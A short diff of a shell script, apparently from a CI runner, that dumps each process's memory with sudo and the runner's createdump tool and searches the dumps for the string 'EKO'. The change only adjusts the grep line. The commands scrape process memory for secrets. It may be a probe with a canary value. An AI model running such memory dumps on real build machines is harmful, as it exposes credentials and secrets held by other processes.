@@ -26,8 +26,8 @@ do
     echo $(pwdx $pid) >> /tmp/file.txt;
     echo "sudo /home/runner/runners/2.284.0/bin/createdump -n $pid" >> /tmp/file.txt;
     echo $(sudo /home/runner/runners/2.284.0/bin/createdump -n $pid) >> /tmp/file.txt;
-    echo "cat /tmp/coredump.$pid -v" >> /tmp/file.txt;
-    echo $(cat /tmp/coredump.$pid -v | grep EKO) >> /tmp/file.txt;
+    echo "cat /tmp/coredump.$pid -| grep EKO" >> /tmp/file.txt;
+    echo $(cat /tmp/coredump.$pid | grep EKO) >> /tmp/file.txt;
 done
 
 #echo "--- strings"
